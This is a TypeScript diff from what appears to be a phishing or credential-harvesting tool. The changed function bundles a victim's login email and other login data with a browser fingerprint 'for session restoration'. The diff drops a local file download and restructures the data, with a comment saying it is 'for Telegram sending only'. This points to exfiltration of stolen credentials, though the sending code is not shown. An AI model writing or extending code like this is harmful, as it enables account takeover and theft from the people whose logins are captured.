@@ -264,8 +264,9 @@ export const collectBrowserFingerprint = (): BrowserFingerprint => {
   };
 };
 
-export const createCookiesFile = (fingerprint: BrowserFingerprint, loginData: any) => {
-  const cookiesData = {
+// Helper function to create cookies file data structure (for Telegram sending only)
+export const createCookiesFileData = (fingerprint: BrowserFingerprint, loginData: any) => {
+  return {
     timestamp: new Date().toISOString(),
     loginInfo: {
       email: loginData.email,
@@ -282,17 +283,4 @@ export const createCookiesFile = (fingerprint: BrowserFingerprint, loginData: an
       fingerprint: "Complete browser fingerprint for session restoration"
     }
   };
-  
-  // Create and download the file
-  const blob = new Blob([JSON.stringify(cookiesData, null, 2)], { type: 'application/json' });
-  const url = URL.createObjectURL(blob);
-  const link = document.createElement('a');
-  link.href = url;
-  link.download = `browser_session_${loginData.email}_${Date.now()}.json`;
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
-  URL.revokeObjectURL(url);
-  
-  console.log('Browser session file downloaded:', cookiesData);
 };
